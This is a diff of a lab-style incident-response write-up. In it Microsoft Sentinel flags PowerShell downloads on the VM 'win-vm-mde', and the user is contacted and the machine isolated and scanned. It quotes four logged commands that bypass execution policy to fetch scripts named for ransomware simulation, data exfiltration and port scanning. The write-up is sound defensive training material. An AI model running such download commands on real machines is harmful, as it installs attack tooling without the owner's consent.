@@ -53,14 +53,13 @@
 
 ![image](https://github.com/user-attachments/assets/61e1553f-5790-4b01-aa4d-ef605a3a8613)
 
-Microsoft Sentinel will execute the query to log any accounts that failed login attempts on the `win-vm-mde` host machine. In the following Incidents diagram, two entities will be displayed: the target device `(DeviceName)` under attack, and the remote IP addresses `(RemoteIP)` attempting the login.
+Another query will be executed against the data in the Log Analytics workspace to log the account `win-vm-mde` and the device name to see if a user has been invoking malicious PowerShell commands such as `Invoke-WebRequest`.
 
 
 ![image](https://github.com/user-attachments/assets/948e20eb-be81-4d74-988e-39b82bcd0f32)
 
-After the rule was created, we see two entities: the host machine `win-vm-mde` and the IP address `193.37.69.105`. In our initial findings, there were 4 total IP addresses including this one that reportedly originated from Russia. They all occurred within the 5-day window and yet did not appear as separate entities. 
+After the rule was created, we see five entities: the host machine `win-vm-mde` and the different PowerShell commands that were executed.
 
-![image](https://github.com/user-attachments/assets/ec4ad430-8aa5-4ed6-b2bf-04a958ead84d)
 
 <img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />
 
@@ -73,23 +72,21 @@ After the rule was created, we see two entities: the host machine `win-vm-mde` a
 ![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)
 
 
-Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, it was discovered that the following PowerShell commands were run on machine `win-vm-mde`
+Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, the user `ylavnu` downloaded four different scripts with 4 different commands on the host machine `win-vm-mde`. The following commands were
 
-The `Alert PowerShell Suspicious Web Request Rule` incident was triggered by 1 user, but downloaded 4 different scripts with 4 different commands.
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 
-win-vm-mde
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
 
-The folowing scripts contained
-portscan.ps1
-eicar.ps1
-exfiltratedata.ps1
-pwncrypt.ps1
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`
+
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
 
 ![image](https://github.com/user-attachments/assets/1a5b9297-7f69-46af-84ac-733aee1430f4)
+
+
+![image](https://github.com/user-attachments/assets/ec4ad430-8aa5-4ed6-b2bf-04a958ead84d)
+
 
 
 The user `ylavnu` was contacted and asked what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software, which resulted in a black screen for a few seconds, and then 'nothing happened' afterwards. 
@@ -124,6 +121,8 @@ pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ran
 - A full antimalware scan was performed on the VM through MDE.
 
 - After the machine was returned with no trace of malware, it was removed from isolation.
+
+- 
 
 
 ### **Closure**
